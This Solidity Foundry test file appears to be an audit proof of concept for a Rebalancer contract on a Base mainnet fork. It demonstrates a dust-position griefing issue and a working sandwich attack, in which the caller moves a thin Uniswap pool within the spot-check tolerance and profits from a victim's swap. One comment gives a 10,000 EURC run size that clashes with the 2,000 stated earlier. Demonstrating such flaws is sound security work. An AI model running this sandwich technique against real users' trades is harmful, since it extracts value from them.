// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Test, console} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Rebalancer} from "../src/Rebalancer.sol";
import {IV3SwapRouter} from "../src/interfaces/IV3SwapRouter.sol";

contract PocFork is Test {
    IERC20 constant EURC = IERC20(0x60a3E35Cc302bFA44Cb288Bc5a4F316Fdb1adb42);
    IERC20 constant CBBTC = IERC20(0xcbB7C0000aB88B473b1f5aFd9ef808440eed33Bf);
    IERC20 constant USDC = IERC20(0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913);
    address constant ROUTER = 0x2626664c2603336E57B271c5C0b26F421741e481;
    address constant POOL_EURC_USDC = 0x7279c08A36333e12c3Fc81747963264c100D66fB;
    address constant POOL_USDC_CBBTC = 0xfBB6Eed8e7aa03B138556eeDaF5D271A5E1e43ef;
    address treasury = makeAddr("treasury");
    address forwarder = makeAddr("forwarder");
    address keeper = makeAddr("keeper");
    Rebalancer r;

    function setUp() public {
        vm.createSelectFork(vm.envOr("BASE_RPC_URL", string("https://mainnet.base.org")));
        vm.etch(forwarder, hex"5f");
        r = new Rebalancer(Rebalancer.Deployment({
            eurc: address(EURC), cbbtc: address(CBBTC), usdc: address(USDC), router: ROUTER,
            feedCbbtcUsd: 0x07DA0E54543a844a80ABE69c8A12F22B3aA59f9D, feedEurcUsd: 0xDAe398520e2B67cd3f27aeF9Cf14D93D927f8250,
            sequencerFeed: 0xBCF85224fc0756B9Fa45aA7892530B47e10b6433, poolEurcUsdc: POOL_EURC_USDC,
            poolUsdcCbbtc: POOL_USDC_CBBTC, treasury: treasury, forwarder: forwarder, workflowOwner: makeAddr("wf")
        }));
    }

    function _fund(address u, uint256 e, uint256 b) internal {
        if (e > 0) { vm.prank(POOL_EURC_USDC); EURC.transfer(u, e); }
        if (b > 0) { vm.prank(POOL_USDC_CBBTC); CBBTC.transfer(u, b); }
        vm.startPrank(u);
        EURC.approve(address(r), type(uint256).max);
        CBBTC.approve(address(r), type(uint256).max);
        vm.stopPrank();
    }

    /// B: dust owner with amountIn = 1 base unit EURC: always due, always reverts on Uniswap.
    function test_poc_dustOwnerAlwaysDueAlwaysReverts() public {
        address dust = makeAddr("dust");
        _fund(dust, 10, 0); // 0.00001 EURC
        vm.prank(dust);
        r.setParams(Rebalancer.Params({active: true, targetBps: 8000, bandBps: 1, maxCorrectionBps: 1, minTradeEurc: 1, interval: 1 hours, maxSlippageBps: 100}));
        (bool due, int256 delta) = r.isDue(dust);
        assertTrue(due);
        assertEq(delta, 1);
        address[] memory page = r.dueOwners(0, 10);
        assertEq(page.length, 1);
        uint256 g = gasleft();
        vm.expectRevert();
        r.execute(dust, keeper);
        console.log("gas of the failed execute:", g - gasleft());
        assertEq(r.lastExecutedAt(dust), 0);
        (due,) = r.isDue(dust);
        assertTrue(due, "stays due after revert");
    }

    /// B2: which dust amount does succeed (so costs the keeper 400k gas for a fee of 0)?
    function test_poc_dustRunSucceedsWithZeroFee() public {
        address dust = makeAddr("dust2");
        _fund(dust, 1e6, 0); // 1 EURC
        vm.prank(dust);
        r.setParams(Rebalancer.Params({active: true, targetBps: 8000, bandBps: 1, maxCorrectionBps: 1, minTradeEurc: 1, interval: 1 hours, maxSlippageBps: 100}));
        (bool due, int256 delta) = r.isDue(dust);
        assertTrue(due);
        console.log("amountIn (EURC base units):", uint256(delta)); // 100 = 0.0001 EURC
        uint256 g = gasleft();
        r.execute(dust, keeper);
        console.log("gas of the successful dust run:", g - gasleft());
        console.log("fee to keeper:", EURC.balanceOf(keeper), "to treasury:", EURC.balanceOf(treasury));
        assertEq(EURC.balanceOf(keeper), 0);
    }

    /// C: the caller sandwiches his own execute within the 0.5% spot check.
    ///    Buyer: 20,000 EURC, cap 10% -> run of 2,000 EURC. Attacker first sells EURC into the thin
    ///    EURC/USDC pool (EURC gets cheaper, spot cbBTC-in-EURC rises), lets the run go (which buys
    ///    at a worse price), and then buys the EURC back.
    function test_poc_executorSandwich() public {
        address buyer = makeAddr("buyer");
        deal(address(EURC), buyer, 20_000e6);
        _fund(buyer, 0, 0);
        vm.prank(buyer);
        r.setParams(Rebalancer.Params({active: true, targetBps: 8000, bandBps: 500, maxCorrectionBps: 1000, minTradeEurc: 5e6, interval: 1 days, maxSlippageBps: 100}));

        address atk = makeAddr("atk");
        uint256 oracle = r.quote();
        console.log("oracle:", oracle, "spot:", r.spot());
        console.log("EURC in pool:", EURC.balanceOf(POOL_EURC_USDC) / 1e6, "USDC in pool:", USDC.balanceOf(POOL_EURC_USDC) / 1e6);

        // Find the largest EURC amount at which the spot stays within 0.5% (bisection on a snapshot).
        uint256 lo = 0; uint256 hi = 30_000e6;
        for (uint256 i = 0; i < 20; i++) {
            uint256 mid = (lo + hi) / 2;
            uint256 snap = vm.snapshotState();
            _sellEurc(atk, mid);
            bool ok;
            try r.quoteChecked() { ok = true; } catch {}
            vm.revertToState(snap);
            if (ok) lo = mid; else hi = mid;
        }
        console.log("max EURC sell within 0.5%:", lo / 1e6);

        // 1) Attacker sells `lo` EURC -> USDC.
        uint256 usdcGot = _sellEurc(atk, lo);
        console.log("spot after push:", r.spot(), "deviation bps:", (r.spot() - oracle) * 10_000 / oracle);
        // 2) execute(buyer) -> buyer buys cbBTC for 10,000 EURC.
        uint256 btcBefore = CBBTC.balanceOf(buyer);
        r.execute(buyer, atk);
        uint256 btcGot = CBBTC.balanceOf(buyer) - btcBefore;
        uint256 fairBtc = 1_995e6 * 1e8 / oracle;
        console.log("buyer got sats:", btcGot, "fair (oracle, after fee):", fairBtc);
        console.log("buyer loss vs oracle in bps:", (fairBtc - btcGot) * 10_000 / fairBtc);
        // 3) Attacker buys EURC back with all USDC.
        uint256 eurcBack = _buyEurc(atk, usdcGot);
        int256 profit = int256(eurcBack) - int256(lo) + int256(EURC.balanceOf(atk) - eurcBack); // + reward
        console.log("attacker EURC profit (incl. 0.05 reward), base units:", profit);
    }

    function _sellEurc(address who, uint256 amt) internal returns (uint256 out) {
        deal(address(EURC), who, EURC.balanceOf(who) + amt);
        vm.startPrank(who);
        EURC.approve(ROUTER, amt);
        out = IV3SwapRouter(ROUTER).exactInput(IV3SwapRouter.ExactInputParams({
            path: abi.encodePacked(address(EURC), uint24(500), address(USDC)), recipient: who, amountIn: amt, amountOutMinimum: 0
        }));
        vm.stopPrank();
    }

    function _buyEurc(address who, uint256 usdcAmt) internal returns (uint256 out) {
        vm.startPrank(who);
        USDC.approve(ROUTER, usdcAmt);
        out = IV3SwapRouter(ROUTER).exactInput(IV3SwapRouter.ExactInputParams({
            path: abi.encodePacked(address(USDC), uint24(500), address(EURC)), recipient: who, amountIn: usdcAmt, amountOutMinimum: 0
        }));
        vm.stopPrank();
    }
}
